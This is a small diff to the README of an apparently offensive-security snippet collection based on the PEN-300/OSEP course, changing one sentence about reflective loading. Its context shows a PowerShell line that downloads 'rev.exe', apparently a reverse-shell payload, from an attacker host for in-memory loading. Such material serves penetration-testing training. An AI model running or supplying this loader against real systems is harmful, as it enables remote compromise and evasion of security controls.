@@ -1,7 +1,7 @@
 # OSEP Code Snippets
 Code examples are provided as-is, without any form of warranty. Based on Offensive Security's [PEN-300](https://www.offensive-security.com/pen300-osep/) course.
 
-Classes and methods are public, so most binaries should allow for reflective loading as below.
+Classes and methods are public, so most binaries should allow for reflective loading as below..
 
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/rev.exe')
